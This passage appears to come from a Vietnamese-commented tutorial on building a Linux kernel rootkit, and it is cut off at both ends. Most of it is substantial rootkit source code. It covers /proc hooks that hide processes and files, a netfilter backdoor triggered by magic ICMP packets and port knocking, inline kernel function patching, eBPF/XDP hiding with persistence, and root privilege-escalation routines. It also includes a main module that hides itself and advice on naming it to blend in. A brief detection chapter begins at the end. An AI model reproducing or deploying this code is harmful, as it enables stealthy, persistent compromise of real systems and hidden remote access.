                /* name là numeric → PID directory.
                 * Check nếu PID cần ẩn. */
                if (is_pid_hidden((pid_t)pid_val))
                    return true;  /* Skip — không ghi entry → PID ẩn */
            }
        }
    }

    /* Case 2: Ẩn file/directory có prefix */
    if (namlen >= strlen(HIDDEN_PREFIX) &&
        strncmp(name, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0) {
        return true;  /* Skip entry */
    }

    /* Entry hợp lệ — gọi original filldir để ghi vào buffer */
    return orig_proc_filldir(ctx, name, namlen, offset, ino, d_type);
}

/*
 * Custom dir_context — wrapper quanh original context
 *
 * dir_context structure:
 *   struct dir_context {
 *       filldir_t actor;    ← function pointer gọi cho mỗi entry
 *       loff_t pos;         ← current position trong directory
 *   };
 *
 * Ta tạo wrapper context với actor = rk_proc_filldir.
 * Pass wrapper tới original iterate_shared.
 * Khi kernel iterate → gọi rk_proc_filldir cho mỗi entry.
 */
struct rk_dir_context {
    struct dir_context ctx;      /* Must be first (for casting) */
    struct dir_context *orig;    /* Original context */
};

static int hooked_proc_iterate(struct file *file,
                                struct dir_context *ctx)
{
    int ret;

    /* Save original filldir */
    orig_proc_filldir = ctx->actor;

    /* Thay actor bằng custom filldir.
     *
     * Ta modify ctx trực tiếp (in-place) thay vì tạo wrapper.
     * Đơn giản hơn và avoid allocation. */
    ctx->actor = rk_proc_filldir;

    /* Gọi original iterate_shared với modified context.
     * Kernel sẽ iterate /proc entries → gọi rk_proc_filldir
     * cho mỗi entry → rk_proc_filldir filter → pass hoặc skip. */
    ret = orig_proc_iterate(file, ctx);

    /* Restore original actor (clean up) */
    ctx->actor = orig_proc_filldir;

    return ret;
}

/* ══════════════════════════════════════════════════════════════
 * INSTALLATION
 *
 * Để hook iterate_shared, ta phải:
 * 1. Tìm file_operations struct của /proc root
 * 2. Save original iterate_shared pointer
 * 3. Replace bằng hooked version
 *
 * Thách thức: file_operations thường const (read-only).
 * Phải make writable trước khi modify.
 * ══════════════════════════════════════════════════════════════ */

static struct file_operations *proc_fops = NULL;

int rk_vfs_hook_install(void)
{
    struct file *proc_file;

    /* Mở /proc để lấy file_operations.
     *
     * filp_open(): kernel-internal open. Khác open() syscall:
     * - Không đi qua VFS name resolution chain
     * - Trực tiếp resolve path và return struct file *
     * - Chạy trong kernel context (không phải process context fd) */
    proc_file = filp_open("/proc", O_RDONLY, 0);
    if (IS_ERR(proc_file)) {
        pr_err("rk: cannot open /proc\n");
        return PTR_ERR(proc_file);
    }

    /* Lấy file_operations từ struct file.
     *
     * f_op = file operations table cho file/directory này.
     * Mọi file thuộc cùng filesystem type chia sẻ f_op.
     * → Modify f_op = affect TẤT CẢ files cùng type.
     * Cho /proc: proc_root_operations là shared. */
    proc_fops = (struct file_operations *)proc_file->f_op;

    /* Save original */
    orig_proc_iterate = proc_fops->iterate_shared;

    /* Make f_op writable.
     * file_operations struct thường trong read-only memory. */
    rk_unprotect_memory();

    /* Overwrite iterate_shared pointer */
    proc_fops->iterate_shared = hooked_proc_iterate;

    rk_protect_memory();

    filp_close(proc_file, NULL);

    pr_info("rk: VFS hook installed on /proc\n");
    return 0;
}

void rk_vfs_hook_remove(void)
{
    if (!proc_fops || !orig_proc_iterate)
        return;

    rk_unprotect_memory();
    proc_fops->iterate_shared = orig_proc_iterate;
    rk_protect_memory();

    pr_info("rk: VFS hook removed from /proc\n");
}
```

---

## Chapter 8: Network Rootkit — Netfilter & Covert Channel

```c
/* netfilter.c — Network hiding và covert communication
 *
 * Netfilter = Linux kernel framework xử lý packets tại các
 * hook points trong network stack.
 *
 * Hook points (NF_INET_*):
 *
 *   ┌──────────────────────────────────────────────────┐
 *   │               Network Stack                       │
 *   │                                                  │
 *   │  Incoming:                                       │
 *   │   NIC → PRE_ROUTING → [routing] → LOCAL_IN → App│
 *   │                          │                       │
 *   │                          └→ FORWARD → POST_ROUTING → NIC
 *   │                                                  │
 *   │  Outgoing:                                       │
 *   │   App → LOCAL_OUT → [routing] → POST_ROUTING → NIC│
 *   └──────────────────────────────────────────────────┘
 *
 *   PRE_ROUTING:  packet vừa arrive, trước routing decision
 *   LOCAL_IN:     packet destined cho local machine
 *   FORWARD:      packet được forward (router mode)
 *   LOCAL_OUT:    locally-generated packet
 *   POST_ROUTING: packet chuẩn bị leave
 *
 * Rootkit hook PRE_ROUTING hoặc LOCAL_IN để:
 *   1. Detect magic packets (trigger backdoor)
 *   2. Hide C2 traffic (NF_STOLEN — "ăn" packet)
 *   3. Port knocking (SYN sequence detection)
 *   4. Covert channel (data in ICMP, DNS, TCP options)
 */

#include "rootkit.h"
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/icmp.h>
#include <linux/inet.h>
#include <net/ip.h>
#include <net/tcp.h>

/* ══════════════════════════════════════════════════════════════
 * MAGIC PACKET TRIGGER
 *
 * Passive backdoor — rootkit KHÔNG beacon, đợi magic packet.
 * Pattern từ BPFDoor (APT):
 *   1. Attacker gửi specially crafted packet
 *   2. Rootkit detect magic bytes trong packet
 *   3. Rootkit activate — open reverse shell / execute command
 *
 * Packet KHÔNG đi tới application layer (NF_STOLEN) → invisible
 * cho netstat, tcpdump (nếu capture SAU netfilter hook).
 *
 * Magic packet format (custom):
 *   ICMP Echo Request với payload bắt đầu bằng magic bytes.
 *   ICMP vì: firewall thường cho qua ICMP, looks like ping.
 * ══════════════════════════════════════════════════════════════ */

#define MAGIC_VALUE    0xDEAD1337  /* 4 bytes magic identifier */
#define MAGIC_PASS     "s3cr3t"    /* Password trong payload */

/*
 * Magic packet payload structure:
 *   ┌───────────┬──────────────┬──────────────┬──────────────┐
 *   │ magic(4B) │ password(32B)│ cmd_type(1B) │ cmd_data(var)│
 *   └───────────┴──────────────┴──────────────┴──────────────┘
 *
 * cmd_type:
 *   0x01 = activate reverse shell (cmd_data = C2 IP:port)
 *   0x02 = execute command (cmd_data = command string)
 *   0x03 = exfiltrate file (cmd_data = filepath)
 *   0x04 = self-destruct (remove rootkit)
 */
struct magic_packet {
    u32  magic;
    char password[32];
    u8   cmd_type;
    char cmd_data[256];
} __attribute__((packed));

/* ══════════════════════════════════════════════════════════════
 * PORT KNOCKING
 *
 * Sequence detection: attacker gửi SYN packets tới ports
 * theo đúng thứ tự → rootkit activate.
 *
 * Ví dụ sequence: SYN→1234, SYN→5678, SYN→9012
 * Đúng thứ tự = unlock. Sai thứ tự = reset.
 *
 * Ưu điểm so với magic packet:
 *   - SYN packets giống port scan → ít suspicious
 *   - Không cần crafted payload
 *   - Firewall thấy dropped SYNs (closed ports) → normal
 * ══════════════════════════════════════════════════════════════ */

#define KNOCK_SEQUENCE_LEN 3
static const u16 knock_sequence[KNOCK_SEQUENCE_LEN] = {
    7000, 8000, 9000
};

struct knock_state {
    __be32 src_ip;           /* Source IP đang knock */
    int    current_step;     /* Step hiện tại trong sequence */
    unsigned long timestamp; /* Timeout tracking */
};

#define MAX_KNOCK_STATES 16
static struct knock_state knock_states[MAX_KNOCK_STATES];
static DEFINE_SPINLOCK(knock_lock);

static struct knock_state *find_knock_state(__be32 src_ip)
{
    int i;
    for (i = 0; i < MAX_KNOCK_STATES; i++) {
        if (knock_states[i].src_ip == src_ip)
            return &knock_states[i];
    }
    return NULL;
}

static struct knock_state *alloc_knock_state(__be32 src_ip)
{
    int i;

    /* Tìm slot trống hoặc expired */
    for (i = 0; i < MAX_KNOCK_STATES; i++) {
        if (knock_states[i].src_ip == 0 ||
            time_after(jiffies,
                       knock_states[i].timestamp + 30 * HZ)) {
            /* time_after(a, b): true nếu a sau b.
             * 30 * HZ = 30 seconds timeout.
             * HZ = ticks per second (thường 250 hoặc 1000). */
            knock_states[i].src_ip = src_ip;
            knock_states[i].current_step = 0;
            knock_states[i].timestamp = jiffies;
            return &knock_states[i];
        }
    }
    return NULL;
}

static bool check_port_knock(__be32 src_ip, u16 dest_port)
{
    struct knock_state *state;
    bool activated = false;

    spin_lock(&knock_lock);

    state = find_knock_state(src_ip);

    if (!state) {
        /* New knocker — check if first port matches */
        if (dest_port == knock_sequence[0]) {
            state = alloc_knock_state(src_ip);
            if (state)
                state->current_step = 1;
        }
        spin_unlock(&knock_lock);
        return false;
    }

    /* Timeout check */
    if (time_after(jiffies, state->timestamp + 30 * HZ)) {
        state->src_ip = 0;  /* Expired — reset */
        spin_unlock(&knock_lock);
        return false;
    }

    /* Check if port matches next expected in sequence */
    if (dest_port == knock_sequence[state->current_step]) {
        state->current_step++;
        state->timestamp = jiffies;

        if (state->current_step >= KNOCK_SEQUENCE_LEN) {
            /* SEQUENCE COMPLETE — activate backdoor */
            activated = true;
            state->src_ip = 0;  /* Reset state */
            pr_info("rk: port knock sequence completed from %pI4\n",
                    &src_ip);
        }
    } else {
        /* Wrong port — reset sequence */
        state->src_ip = 0;
    }

    spin_unlock(&knock_lock);
    return activated;
}

/* ══════════════════════════════════════════════════════════════
 * NETFILTER HOOK CALLBACK — Main packet handler
 * ══════════════════════════════════════════════════════════════ */

static unsigned int nf_hook_handler(void *priv,
                                     struct sk_buff *skb,
                                     const struct nf_hook_state *state)
{
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    struct icmphdr *icmp_header;
    unsigned int data_len;
    unsigned char *data;

    if (!skb)
        return NF_ACCEPT;

    /* Lấy IP header.
     *
     * sk_buff = socket buffer — chứa packet data + metadata.
     * ip_hdr(skb): macro trả về pointer tới IP header trong skb. */
    ip_header = ip_hdr(skb);

    /* ──── ICMP Magic Packet Detection ──── */
    if (ip_header->protocol == IPPROTO_ICMP) {
        icmp_header = icmp_hdr(skb);

        /* Chỉ xử lý Echo Request (type 8) — looks like ping */
        if (icmp_header->type == ICMP_ECHO) {
            /* Payload bắt đầu SAU ICMP header */
            data = (unsigned char *)icmp_header + sizeof(struct icmphdr);
            data_len = ntohs(ip_header->tot_len)
                     - (ip_header->ihl * 4)
                     - sizeof(struct icmphdr);

            if (data_len >= sizeof(struct magic_packet)) {
                struct magic_packet *mp = (struct magic_packet *)data;

                if (ntohl(mp->magic) == MAGIC_VALUE &&
                    strncmp(mp->password, MAGIC_PASS,
                            strlen(MAGIC_PASS)) == 0) {

                    /* Magic packet nhận diện!
                     * Dispatch theo cmd_type */
                    pr_info("rk: magic packet from %pI4, cmd=%d\n",
                            &ip_header->saddr, mp->cmd_type);

                    switch (mp->cmd_type) {
                    case 0x01:
                        /* Reverse shell — spawn kthread */
                        /* rk_spawn_reverse_shell(mp->cmd_data); */
                        break;
                    case 0x02:
                        /* Execute command */
                        /* rk_execute_command(mp->cmd_data); */
                        break;
                    case 0x04:
                        /* Self-destruct */
                        /* rk_self_destruct(); */
                        break;
                    }

                    /* NF_STOLEN: kernel "quên" packet này.
                     *
                     * Packet KHÔNG:
                     *   - Đi vào userspace application
                     *   - Xuất hiện trong tcpdump (nếu capture SAU hook)
                     *   - Generate ICMP reply
                     *   - Đi qua remaining netfilter hooks
                     *
                     * Caller PHẢI free skb nếu return NF_STOLEN:
                     * kfree_skb(skb); — nhưng netfilter handles this
                     * khi hook return NF_STOLEN. */
                    return NF_STOLEN;
                }
            }
        }
    }

    /* ──── TCP Port Knock Detection ──── */
    if (ip_header->protocol == IPPROTO_TCP) {
        tcp_header = tcp_hdr(skb);

        /* Chỉ xử lý SYN packets (connection initiation) */
        if (tcp_header->syn && !tcp_header->ack) {
            u16 dest_port = ntohs(tcp_header->dest);

            if (check_port_knock(ip_header->saddr, dest_port)) {
                /* Knock sequence complete → activate */
                /* rk_activate_backdoor(ip_header->saddr); */
            }
        }

        /* ──── Hide traffic trên HIDDEN_PORT ──── */
        if (ntohs(tcp_header->source) == HIDDEN_PORT ||
            ntohs(tcp_header->dest)   == HIDDEN_PORT) {
            /* Cho packet pass nhưng mark để hide từ logging.
             * Alternative: NF_STOLEN để completely invisible. */

            /* Trick: set skb->sk = NULL → connection tracking skip.
             * Conntrack miss = netstat/ss không thấy connection. */
        }
    }

    return NF_ACCEPT;  /* Cho tất cả traffic khác pass */
}

/* ══════════════════════════════════════════════════════════════
 * NETFILTER REGISTRATION
 * ══════════════════════════════════════════════════════════════ */

static struct nf_hook_ops nf_ops = {
    .hook     = nf_hook_handler,
    .pf       = PF_INET,            /* IPv4 */
    .hooknum  = NF_INET_PRE_ROUTING, /* Earliest hook point */
    .priority = NF_IP_PRI_FIRST,     /* Highest priority — chạy trước mọi hook khác */
};

/* Nếu cần hook IPv6: register thêm với pf = PF_INET6 */

int rk_net_init(void)
{
    int err;

    /* nf_register_net_hook(): register hook trong network namespace.
     * &init_net = initial (default) network namespace. */
    err = nf_register_net_hook(&init_net, &nf_ops);
    if (err) {
        pr_err("rk: netfilter hook registration failed: %d\n", err);
        return err;
    }

    memset(knock_states, 0, sizeof(knock_states));

    pr_info("rk: netfilter hook registered\n");
    return 0;
}

void rk_net_cleanup(void)
{
    nf_unregister_net_hook(&init_net, &nf_ops);
    pr_info("rk: netfilter hook unregistered\n");
}
```

---

## Chapter 9: Inline Hooking

```c
/* inline_hook.c — Inline function hooking (code patching)
 *
 * Concept: THAY ĐỔI BYTES ĐẦU TIÊN của target function
 * bằng JMP instruction tới hook function.
 *
 * Đây là kỹ thuật dùng trong:
 * - Game hacking (Detours library trên Windows)
 * - Anti-virus hooking
 * - Rootkit khi không thể dùng syscall table / ftrace
 *
 * Tại sao inline hook khi đã có ftrace:
 *   1. Ftrace có thể bị disabled (CONFIG_FTRACE=n)
 *   2. Ftrace hook visible trong debugfs
 *   3. Inline hook khó detect hơn (code modification ở level byte)
 *   4. Hoạt động trên bất kỳ kernel function, kể cả non-traceable
 *
 * CÁCH HOẠT ĐỘNG:
 *
 * Original function:
 *   target_func:
 *     55                  push rbp
 *     48 89 e5            mov rbp, rsp
 *     48 83 ec 20         sub rsp, 0x20
 *     ...
 *
 * After inline hook:
 *   target_func:
 *     48 b8 xx xx xx xx   mov rax, hook_func_addr   (10 bytes)
 *     xx xx xx xx
 *     ff e0               jmp rax                    (2 bytes)
 *                                                    Total: 12 bytes
 *
 * Trampoline (để gọi original function):
 *   trampoline:
 *     55                  push rbp          }  saved original
 *     48 89 e5            mov rbp, rsp      }  bytes (12 bytes)
 *     48 83 ec 20         sub rsp, 0x20     }  
 *     48 b8 yy yy yy yy   mov rax, target_func+12
 *     yy yy yy yy
 *     ff e0               jmp rax    → continue original after patch point
 *
 * Khi hook active:
 *   caller → target_func → JMP hook_func
 *                            hook_func: do stuff
 *                            hook_func: call trampoline (= original)
 *                            trampoline: execute saved bytes
 *                            trampoline: JMP target_func+12
 *                            target_func continues normally
 */

#include "rootkit.h"
#include <asm/text-patching.h>  /* text_poke nếu available */

#define HOOK_SIZE 12  /* mov rax, imm64 (10) + jmp rax (2) */

struct inline_hook {
    const char *name;        /* Target function name */
    void *target;            /* Resolved address */
    void *hook_fn;           /* Our hook function */
    unsigned char orig_bytes[HOOK_SIZE];  /* Saved original bytes */
    unsigned char *trampoline;            /* Executable trampoline */
    bool active;
};

/*
 * Allocate executable memory cho trampoline.
 *
 * Trampoline cần:
 * 1. Chứa original bytes (12 bytes)
 * 2. Chứa jump back instruction (12 bytes)
 * 3. Nằm trong EXECUTABLE memory
 *
 * module_alloc(): allocate memory trong module address range.
 * Memory này executable (khác kmalloc — data memory, non-exec).
 *
 * Tại sao module_alloc: vì SMEP, NX — không thể execute data pages.
 * module_alloc trả về memory trong module code range = executable.
 */
static int create_trampoline(struct inline_hook *hook)
{
    unsigned char jmp_back[HOOK_SIZE];

    /* Allocate executable memory.
     * HOOK_SIZE * 2 = original bytes + jump back = 24 bytes.
     * module_alloc rounds up to page size internally. */
    hook->trampoline = module_alloc(HOOK_SIZE * 2);
    if (!hook->trampoline)
        return -ENOMEM;

    /* Copy original bytes vào trampoline */
    memcpy(hook->trampoline, hook->orig_bytes, HOOK_SIZE);

    /* Build jump-back instruction:
     *   mov rax, (target + HOOK_SIZE)
     *   jmp rax
     * → Sau khi execute saved bytes, jump tới instruction #13
     *   trong original function (tiếp tục bình thường) */
    jmp_back[0] = 0x48;  /* REX.W prefix */
    jmp_back[1] = 0xb8;  /* mov rax, imm64 */
    *(unsigned long *)(jmp_back + 2) =
        (unsigned long)hook->target + HOOK_SIZE;
    jmp_back[10] = 0xff;  /* jmp */
    jmp_back[11] = 0xe0;  /* rax */

    memcpy(hook->trampoline + HOOK_SIZE, jmp_back, HOOK_SIZE);

    /* Set trampoline pages executable.
     * module_alloc memory should already be executable,
     * but ensure it explicitly. */
    set_memory_x((unsigned long)hook->trampoline, 1);

    return 0;
}

/*
 * Install inline hook — patch target function prologue.
 *
 * CRITICAL: SMP SAFETY
 *
 * Vấn đề: CPU khác có thể đang execute target function
 * CÙNG LÚC ta đang overwrite bytes. Nếu CPU thấy
 * nửa instruction cũ + nửa instruction mới = crash.
 *
 * Giải pháp kernel:
 *   text_poke_bp(): kernel API cho safe code patching.
 *   Dùng INT3 (breakpoint) approach:
 *   1. Ghi INT3 (1 byte) tại byte đầu → atomic single-byte write
 *   2. Sync tất cả CPUs (IPI)
 *   3. Ghi remaining bytes (sau INT3)
 *   4. Replace INT3 bằng byte đầu của new code
 *   5. Sync tất cả CPUs
 *
 * Nếu text_poke_bp không available (unexported):
 *   Manual approach — riskier:
 *   1. Stop other CPUs (on_each_cpu với IPI)
 *   2. Disable preemption + interrupts
 *   3. Patch code
 *   4. Flush instruction cache
 *   5. Resume other CPUs
 */
static int install_inline_hook(struct inline_hook *hook)
{
    unsigned char jmp_code[HOOK_SIZE];
    int err;

    /* Resolve target address */
    hook->target = (void *)rk_lookup_name(hook->name);
    if (!hook->target) {
        pr_err("rk: inline hook cannot resolve %s\n", hook->name);
        return -ENOENT;
    }

    /* Save original bytes TRƯỚC KHI patch */
    memcpy(hook->orig_bytes, hook->target, HOOK_SIZE);

    /* Create trampoline */
    err = create_trampoline(hook);
    if (err)
        return err;

    /* Build jump-to-hook instruction */
    jmp_code[0] = 0x48;  /* REX.W */
    jmp_code[1] = 0xb8;  /* mov rax, imm64 */
    *(unsigned long *)(jmp_code + 2) = (unsigned long)hook->hook_fn;
    jmp_code[10] = 0xff;  /* jmp rax */
    jmp_code[11] = 0xe0;

    /* Patch target function */
    rk_unprotect_memory();

    /* Disable preemption + interrupts for atomicity */
    unsigned long flags;
    local_irq_save(flags);
    preempt_disable();

    memcpy(hook->target, jmp_code, HOOK_SIZE);

    preempt_enable();
    local_irq_restore(flags);

    rk_protect_memory();

    hook->active = true;
    pr_info("rk: inline hook installed on %s @ %px\n",
            hook->name, hook->target);
    return 0;
}

static void remove_inline_hook(struct inline_hook *hook)
{
    unsigned long flags;

    if (!hook->active)
        return;

    /* Restore original bytes */
    rk_unprotect_memory();

    local_irq_save(flags);
    preempt_disable();

    memcpy(hook->target, hook->orig_bytes, HOOK_SIZE);

    preempt_enable();
    local_irq_restore(flags);

    rk_protect_memory();

    /* Free trampoline */
    if (hook->trampoline) {
        module_free(THIS_MODULE, hook->trampoline);
        hook->trampoline = NULL;
    }

    hook->active = false;
    pr_info("rk: inline hook removed from %s\n", hook->name);
}
```

---

## Chapter 10: eBPF Rootkit — Thế hệ mới

```c
/* eBPF rootkit — USERSPACE loader + kernel eBPF programs
 *
 * eBPF rootkit KHÁC LKM rootkit fundamental:
 *   - Không cần kernel module (không cần insmod, không cần root trên một số config)
 *   - Không xuất hiện trong lsmod (vì không phải module)
 *   - eBPF programs run trong verified sandbox
 *   - Persist qua bpf filesystem pinning
 *   - Legitimate tools (Cilium, Falco) cũng dùng eBPF → khó phân biệt
 *
 * Components:
 *   1. eBPF programs (chạy trong kernel)   → .bpf.c files
 *   2. Userspace loader (load + manage)     → .c file (dùng libbpf)
 *   3. eBPF maps (shared data kernel↔user) → defined trong .bpf.c
 *
 * BUILD SYSTEM:
 *   Cần: clang, llvm, libbpf, bpftool, kernel headers
 *
 *   Makefile:
 *     clang -target bpf -O2 -g -c rootkit.bpf.c -o rootkit.bpf.o
 *     bpftool gen skeleton rootkit.bpf.o > rootkit.skel.h
 *     gcc -o loader loader.c -lbpf -lelf -lz
 *
 * File dưới đây là eBPF KERNEL PROGRAM (.bpf.c).
 * Compile bằng clang với -target bpf.
 */

/* ═══════════════════════════ rootkit.bpf.c ═══════════════════ */

/* NOTE: File .bpf.c dùng restricted C subset:
 *   - Không có loops (trừ bounded loops trên kernel 5.3+)
 *   - Không có global mutable state ngoài maps
 *   - Stack limit: 512 bytes
 *   - Không gọi arbitrary kernel functions
 *   - Chỉ dùng BPF helper functions */

// #include "vmlinux.h"      /* Generated kernel type definitions */
// #include <bpf/bpf_helpers.h>
// #include <bpf/bpf_tracing.h>
// #include <bpf/bpf_core_read.h>

/* ── Example: Trojanize getdents64 return data ──
 *
 * Attach tại tracepoint syscalls/sys_exit_getdents64.
 * Khi syscall return, ta có thể read/modify user buffer.
 *
 * Technique: bpf_probe_write_user() — WRITE vào userspace memory.
 * Đây là BPF helper cực kỳ powerful và dangerous.
 * Chỉ available cho programs type BPF_PROG_TYPE_KPROBE.
 *
 * SEC("kprobe/__x64_sys_getdents64")
 * int BPF_KPROBE(handle_getdents64, const struct pt_regs *regs)
 * {
 *     // Lưu dirent buffer pointer vào map (cho exit handler)
 *     u64 pid_tgid = bpf_get_current_pid_tgid();
 *     struct linux_dirent64 *buf = (void *)PT_REGS_PARM2(regs);
 *     bpf_map_update_elem(&dirent_map, &pid_tgid, &buf, BPF_ANY);
 *     return 0;
 * }
 *
 * SEC("kretprobe/__x64_sys_getdents64")  
 * int BPF_KRETPROBE(handle_getdents64_exit, long ret)
 * {
 *     u64 pid_tgid = bpf_get_current_pid_tgid();
 *     struct linux_dirent64 **buf_ptr;
 *     
 *     buf_ptr = bpf_map_lookup_elem(&dirent_map, &pid_tgid);
 *     if (!buf_ptr || ret <= 0)
 *         return 0;
 *
 *     // Read user buffer, modify, write back
 *     struct linux_dirent64 entry;
 *     bpf_probe_read_user(&entry, sizeof(entry), *buf_ptr);
 *     
 *     // If entry name matches hidden prefix, modify d_reclen
 *     // to skip it (same technique as LKM but from eBPF)
 *     
 *     bpf_map_delete_elem(&dirent_map, &pid_tgid);
 *     return 0;
 * }
 */

/* ── XDP Program: Earliest network hook ──
 *
 * XDP = eXpress Data Path. Hook tại NIC driver level.
 * TRƯỚC Netfilter, TRƯỚC tc, TRƯỚC socket layer.
 * TRƯỚC tcpdump (nếu dùng AF_PACKET sau XDP).
 *
 * Ưu điểm cho rootkit:
 *   - Fastest possible network hook
 *   - Packets bị drop/modify TRƯỚC mọi monitoring tool
 *   - Legitimate use case (DDoS protection) → hard to distinguish
 *
 * SEC("xdp")
 * int xdp_rootkit(struct xdp_md *ctx)
 * {
 *     void *data = (void *)(long)ctx->data;
 *     void *data_end = (void *)(long)ctx->data_end;
 *     struct ethhdr *eth = data;
 *     struct iphdr *ip;
 *     struct icmphdr *icmp;
 *     
 *     if ((void *)(eth + 1) > data_end) return XDP_PASS;
 *     if (eth->h_proto != htons(ETH_P_IP)) return XDP_PASS;
 *     
 *     ip = (void *)(eth + 1);
 *     if ((void *)(ip + 1) > data_end) return XDP_PASS;
 *     if (ip->protocol != IPPROTO_ICMP) return XDP_PASS;
 *     
 *     icmp = (void *)(ip + 1);
 *     if ((void *)(icmp + 1) > data_end) return XDP_PASS;
 *     
 *     // Check magic pattern in ICMP payload
 *     void *payload = (void *)(icmp + 1);
 *     u32 magic;
 *     if (payload + sizeof(u32) > data_end) return XDP_PASS;
 *     magic = *(u32 *)payload;
 *     
 *     if (magic == MAGIC_VALUE) {
 *         // Magic packet! Process and consume.
 *         // Store command in BPF map for userspace handler.
 *         return XDP_DROP;  // Packet disappears at NIC level
 *     }
 *     
 *     return XDP_PASS;
 * }
 *
 * XDP actions:
 *   XDP_PASS:     pass packet to kernel network stack (normal)
 *   XDP_DROP:     drop packet at NIC — BEFORE any kernel processing
 *   XDP_TX:       bounce packet back out same NIC
 *   XDP_REDIRECT: send packet to different NIC/CPU
 *   XDP_ABORTED:  error, drop and notify
 */

/* ═══════════════════════════ loader.c ═══════════════════════
 *
 * Userspace loader cho eBPF rootkit.
 * Compile: gcc -o loader loader.c -lbpf -lelf -lz
 *
 * #include <bpf/libbpf.h>
 * #include "rootkit.skel.h"   // Auto-generated skeleton
 *
 * int main(void) {
 *     struct rootkit_bpf *skel;
 *
 *     // Load + verify eBPF programs
 *     skel = rootkit_bpf__open_and_load();
 *     if (!skel) { perror("load"); return 1; }
 *
 *     // Attach programs to hooks
 *     rootkit_bpf__attach(skel);
 *
 *     // Pin programs to BPF filesystem for persistence
 *     // Programs persist even after loader exits!
 *     bpf_object__pin(skel->obj, "/sys/fs/bpf/rootkit");
 *
 *     // Detach from terminal — rootkit continues running
 *     daemon(0, 0);
 *
 *     // Event loop: read from ring buffer map
 *     // Process commands from magic packets
 *     struct ring_buffer *rb = ring_buffer__new(
 *         bpf_map__fd(skel->maps.events), handle_event, NULL, NULL);
 *
 *     while (1) {
 *         ring_buffer__poll(rb, 100);
 *     }
 *
 *     return 0;
 * }
 */
```

---

## Chapter 11: Privilege Escalation

```c
/* privesc.c — Tất cả phương pháp escalate privilege từ kernel
 *
 * Khi đã có code execution trong kernel (Ring 0),
 * privilege escalation trở thành trivial:
 * ta có quyền TRỰC TIẾP modify credential structures.
 *
 * 3 phương pháp chính:
 */

#include "rootkit.h"

/* ═══════════════════════════════════════
 * METHOD 1: prepare_creds + commit_creds (RECOMMENDED)
 * 
 * Dùng kernel API chính thức.
 * An toàn nhất, handle locking + RCU đúng.
 * ═══════════════════════════════════════ */
static void privesc_api(void)
{
    struct cred *new = prepare_creds();
    if (!new) return;

    new->uid  = new->euid  = new->suid  = new->fsuid  = GLOBAL_ROOT_UID;
    new->gid  = new->egid  = new->sgid  = new->fsgid  = GLOBAL_ROOT_GID;
    new->cap_effective   = CAP_FULL_SET;
    new->cap_permitted   = CAP_FULL_SET;
    new->cap_inheritable = CAP_FULL_SET;
    new->cap_bset        = CAP_FULL_SET;
    new->cap_ambient     = CAP_FULL_SET;

    commit_creds(new);
}

/* ═══════════════════════════════════════
 * METHOD 2: prepare_kernel_cred(NULL) — One-liner
 *
 * prepare_kernel_cred(NULL) tạo credential set giống init process:
 *   uid=0, gid=0, full capabilities
 *
 * Simplest possible privesc.
 * Common trong kernel exploits (stack overflow → ROP → this).
 * ═══════════════════════════════════════ */
static void privesc_kernel_cred(void)
{
    commit_creds(prepare_kernel_cred(NULL));
}

/* ═══════════════════════════════════════
 * METHOD 3: Direct memory write (DKOM approach)
 *
 * Bypass API hoàn toàn. Không trigger audit hooks.
 * Nhưng violates kernel invariants.
 * ═══════════════════════════════════════ */
static void privesc_dkom(void)
{
    struct cred *cred = (struct cred *)current->cred;

    /* Direct write — no locking, no audit, no RCU */
    *(kuid_t *)&cred->uid  = GLOBAL_ROOT_UID;
    *(kuid_t *)&cred->euid = GLOBAL_ROOT_UID;
    *(kgid_t *)&cred->gid  = GLOBAL_ROOT_GID;
    *(kgid_t *)&cred->egid = GLOBAL_ROOT_GID;
    cred->cap_effective = CAP_FULL_SET;
    cred->cap_permitted = CAP_FULL_SET;

    /* Bypass SELinux/AppArmor:
     * security field trong cred chứa LSM-specific data.
     * Setting NULL hoặc init_cred's security = bypass MAC. */
}
```

---

## Chapter 15: Tổng hợp — Full-featured Rootkit

```c
/* main.c — Entry point: kết hợp tất cả components
 *
 * Chọn hooking method tại compile time qua define:
 *   -DUSE_FTRACE    → Ftrace-based (recommended cho kernel >= 5.x)
 *   -DUSE_KPROBE    → Kprobe-based
 *   -DUSE_SYSCALL   → Syscall table (classic)
 *   Default          → Auto-detect best method
 */

#include "rootkit.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("research");
MODULE_DESCRIPTION("Kernel Research Module");

/* Tên module — đặt giống system module để blend in.
 * Ví dụ tên tốt: "kworker", "rcu_tasks", "scsi_mod",
 *                 "nf_conntrack", "overlay"
 * Avoid: "rootkit", "backdoor", "hack" */

static int __init rk_init(void)
{
    int err;

    pr_info("rk: initializing...\n");

    /* 1. Install hooks (chọn 1 method) */
#if defined(USE_FTRACE)
    err = rk_ftrace_install();
#elif defined(USE_KPROBE)
    err = rk_kprobe_install();
#else
    err = rk_install_hooks();  /* Syscall table method */
#endif
    if (err) {
        pr_err("rk: hook installation failed: %d\n", err);
        return err;
    }

    /* 2. Setup VFS hooks (supplementary hiding) */
    rk_vfs_hook_install();

    /* 3. Setup netfilter (magic packet, port knock) */
    err = rk_net_init();
    if (err)
        pr_warn("rk: netfilter init failed (non-fatal)\n");

    /* 4. Ẩn module */
    rk_hide_module();

    /* 5. Ẩn rootkit files on disk */
    /* Files prefixed HIDDEN_PREFIX tự động ẩn qua getdents64 hook */

    pr_info("rk: fully operational\n");
    return 0;
}

static void __exit rk_exit(void)
{
    pr_info("rk: cleaning up...\n");

    /* Cleanup trong thứ tự NGƯỢC với init */
    rk_net_cleanup();
    rk_vfs_hook_remove();

#if defined(USE_FTRACE)
    rk_ftrace_remove();
#elif defined(USE_KPROBE)
    rk_kprobe_remove();
#else
    rk_remove_hooks();
#endif

    /* Đợi in-flight handlers hoàn thành.
     * Nếu rmmod ngay → freed code → crash khi handler return. */
    msleep(50);

    pr_info("rk: cleanup complete\n");
}

module_init(rk_init);
module_exit(rk_exit);
```

---

## Chapter 16: Detection Engineering

```bash
# ═══════════════════════════════════════════════════════════════
# Sau khi viết rootkit, VIẾT DETECTION cho chính nó.
# Đây là cách trở thành security researcher thực sự:
# attack + defense = complete understanding.
# ═══════════════════════════════════════════════════════════════

# ── 1. YARA Rule ──
# Detect rootkit binary (.ko file) trên disk

cat > rootkit_detector.yar << 'YARA'
rule Linux_Rootkit_Generic {
    meta:
